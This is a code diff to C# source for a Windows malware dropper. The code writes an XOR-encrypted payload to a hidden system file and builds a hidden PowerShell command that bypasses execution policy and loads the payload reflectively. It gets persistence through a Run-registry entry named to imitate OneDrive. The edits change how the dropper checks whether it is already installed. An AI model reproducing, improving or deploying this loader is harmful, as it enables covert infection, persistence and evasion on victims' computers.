@@ -27,8 +27,9 @@ namespace dropper
             ms.Dispose();
             byte[] encrypted = XORCrypt(payload_data, xorkey);
             string temppath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\wello.tmp";
+            if (File.Exists(temppath)) Environment.Exit(1);
             File.WriteAllBytes(temppath, encrypted);
-            File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\wello.tmp", FileAttributes.System | FileAttributes.Hidden);
+            File.SetAttributes(temppath, FileAttributes.System | FileAttributes.Hidden);
             string srcvarname = RandomString(6, rng);
             string classname = RandomString(6, rng);
             string functionname = RandomString(6, rng);
@@ -36,7 +37,6 @@ namespace dropper
             string payload = $"powershell.exe -noprofile -executionpolicy bypass -windowstyle hidden -command ${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{xorclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname}([System.IO.File]::ReadAllBytes('{temppath}'), '{xorkey}')).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')))";
 
             RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
-            if (key.GetValueNames().Contains("0neDrive")) Environment.Exit(1);
             key.SetValue("0neDrive", payload);
             key.Dispose();
             Process.Start("cmd.exe", "/c " + payload);
